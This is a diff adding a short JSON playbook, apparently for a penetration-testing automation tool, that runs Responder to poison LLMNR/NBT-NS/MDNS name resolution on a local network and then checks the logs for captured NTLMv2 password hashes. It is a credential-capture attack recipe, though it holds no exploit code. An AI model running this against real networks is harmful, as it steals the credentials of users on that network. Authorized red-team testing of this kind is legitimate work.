@@ -1,0 +1,23 @@
+{
+  "name": "responder_poison",
+  "description": "LLMNR/NBT-NS/MDNS poisoning with Responder to capture NTLMv2 hashes on the local network.",
+  "author": "james-linux",
+  "version": "1.0",
+  "requires_root": true,
+  "steps": [
+    {
+      "id": "responder_run",
+      "action": "responder.start",
+      "params": {
+        "interface": "{{interface}}",
+        "timeout": "{{duration}}"
+      },
+      "description": "Run Responder to poison LLMNR/NBT-NS and capture NTLMv2 hashes"
+    },
+    {
+      "id": "check_hashes",
+      "action": "responder.check_logs",
+      "description": "Check Responder log directory for captured hashes"
+    }
+  ]
+}
